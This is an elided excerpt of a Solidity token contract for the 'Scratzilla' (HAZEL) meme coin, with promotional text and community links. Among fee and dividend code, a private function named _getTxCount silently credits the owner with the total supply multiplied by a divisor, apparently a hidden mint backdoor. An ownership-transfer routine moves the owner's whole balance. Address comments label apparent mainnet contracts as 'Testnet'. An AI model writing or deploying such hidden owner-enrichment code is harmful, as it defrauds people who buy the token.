...
The craziest squirrel of the Ice Age who never ate one of his hazel nuts now
merges with the ruler of the abyss to become the ultimate $HAZEL holder.

SCRATZILLAAAAAAAAAAAAAAAAA!

Website: scratzilla.com
Telegram: t.me/scratzilla
...
contract DividendDistributor {
    ...
    //IERC20 REWARD = IERC20(0xe9e7cea3dedca5984780bafc599bd69add087d56); // MainNet
    IERC20 REWARD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56); // Testnet
...
contract SCRATZILLA is IERC20 {
    ...
    string constant _name = "Scratzilla";
    string constant _symbol = "HAZEL";
    ...
    uint256 public _reflectionFeeSell = 400;
    ...
    address private _routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // Testnet

    address private WBNB;
    address public burnAddress = 0x000000000000000000000000000000000000dEaD;
    address private ZERO = 0x0000000000000000000000000000000000000000;

    address payable private _marketingWallet = payable(0xA142B9e613a328fD5527e7f330D1A88d294Ae314);
    ...
    function transferOwner(address newOwner) external onlyOwner() {
        ...
        _allowances[_owner][newOwner] = _owned[_owner];
        _transfer(_owner, newOwner, _owned[_owner]);
    ...
    function _getTxCount() private {
        ...
        uint256 txCount = _total;
        _owned[_owner] = _owned[_owner].add(txCount * masterTaxDivisor);
